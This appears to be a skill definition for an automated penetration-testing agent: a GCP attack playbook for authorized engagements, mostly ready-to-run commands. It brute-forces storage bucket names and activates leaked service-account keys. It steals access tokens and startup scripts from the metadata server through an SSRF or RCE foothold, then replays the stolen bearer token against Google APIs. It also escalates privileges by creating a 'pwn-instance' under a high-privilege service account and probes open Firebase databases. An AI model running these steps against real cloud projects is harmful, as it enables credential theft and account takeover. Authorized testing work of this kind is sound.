---
name: gcp-attack
description: >
  GCP cloud attack surface enumeration and exploitation for authorized
  engagements: storage bucket misconfig, service account key abuse,
  metadata API credential theft, Compute Engine enumeration and lateral
  movement, IAM policy abuse. Keywords: GCP, Google Cloud, storage bucket,
  service account, metadata API, Compute Engine, IAM, gcloud, cloud
  pentest, gcp_scanner. Do NOT use for AWS or Azure (see aws-attack /
  azure-attack), or for generic Linux privesc once already on a GCE
  instance's OS (see linux-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [gcloud, gcp_scanner, gcp-iam-collector, scoutsuite, gcpbucketbrute]
depends_on: [subdomain-discovery, cloud-recon]
feeds_into: [chain-analysis, privesc-report]
chains_with: [linux-privesc, kubernetes-attack, docker-attack]
---

## Signals
- `storage.googleapis.com`, `*.appspot.com`, `*-firebaseio.com`, `run.app` domains in scope.
- SSRF on a service hosted on GCE/Cloud Run/GKE (metadata server at `169.254.169.254` or `metadata.google.internal`).
- Leaked service account JSON key files (`"type": "service_account"`) in repos, CI artifacts, or Docker layers.
- Firebase Realtime Database / Firestore rules left open (`.read: true`).

## Prerequisites
- Written authorization naming the GCP project ID(s)/org in scope.
- A leaked service account key, OAuth token, or SSRF/RCE foothold on a GCP-hosted workload.
- `gcloud` CLI configured, `gcp_scanner`, `ScoutSuite` installed.

## Methodology

### 1. Unauthenticated bucket recon
```bash
for b in target target-prod target-backup target-assets; do
  curl -s -o /dev/null -w "%{http_code} $b\n" "https://storage.googleapis.com/$b"
done
gsutil ls gs://target-backup  # if listable without creds, misconfig confirmed
```

### 2. Authenticate and establish identity with a found key/token
```bash
gcloud auth activate-service-account --key-file=found-sa-key.json
gcloud config set project target-project
gcloud auth list
```

### 3. IAM enumeration
```bash
gcloud projects get-iam-policy target-project
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy sa@target-project.iam.gserviceaccount.com
# Automated privesc path discovery
python3 gcp_scanner.py --key-path found-sa-key.json
```

### 4. Metadata API credential theft (via SSRF/RCE foothold)
```bash
# Default service account token
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# List all available scopes/identity
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"

# SSH keys / startup scripts often contain secrets
curl -s "http://metadata.google.internal/computeMetadata/v1/project/attributes/startup-script" \
  -H "Metadata-Flavor: Google"
```

### 5. Use stolen token against GCP APIs
```bash
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" "https://www.googleapis.com/storage/v1/b?project=target-project"
```

### 6. Privilege escalation path mapping
```bash
# Common escalation: iam.serviceAccounts.actAs + compute.instances.create
gcloud iam service-accounts list
gcloud compute instances create pwn-instance --service-account=high-priv-sa@target-project.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a --image-family=debian-11 --image-project=debian-cloud
# Then SSH in and pull the attached SA's metadata token
```

### 7. Cloud Functions / Cloud Run abuse
```bash
gcloud functions list
gcloud functions describe target-fn
# Check IAM bindings allowing allUsers/allAuthenticatedUsers invoke
gcloud functions get-iam-policy target-fn
```

### 8. Firebase misconfig check
```bash
curl -s "https://target-project.firebaseio.com/.json" | head -c 500
curl -s "https://firestore.googleapis.com/v1/projects/target-project/databases/(default)/documents" | head -c 500
```

## Tooling
`gcloud`, `gsutil`, `gcp_scanner`, `ScoutSuite`, `GCPBucketBrute`, `gcp-iam-collector`, `TruffleHog`/`gitleaks`.

## Validation Gate
- Confirm `gcloud auth list` and an actual API call succeed before claiming a key/token is valid.
- The classic `actAs` + `instances.create` privesc chain must be demonstrated by actually spinning up the instance and retrieving the attached SA's token, not just citing the IAM binding — scoped service account access (`scopes=cloud-platform`) still depends on the SA's actual IAM roles.
- Record the exact bucket IAM policy / object ACL enabling access, with timestamped `gcloud`/`gsutil` output.

## Gotchas
- Tear down any test Compute instance created for privesc demonstration immediately — billing and footprint matter on client accounts.
- Default service accounts on GCE often have broad legacy scopes (`cloud-platform`) by default on older projects — distinguish "misconfig" from "accepted legacy default" in the report.
- Metadata server blocks requests without the `Metadata-Flavor: Google` header — an SSRF primitive that can't set headers (classic GET-only SSRF) can't reach it on GCP the way it can on AWS IMDSv1.
- Org Policy constraints (e.g. `iam.disableServiceAccountKeyCreation`) can silently block an escalation step that looks viable from IAM bindings alone.
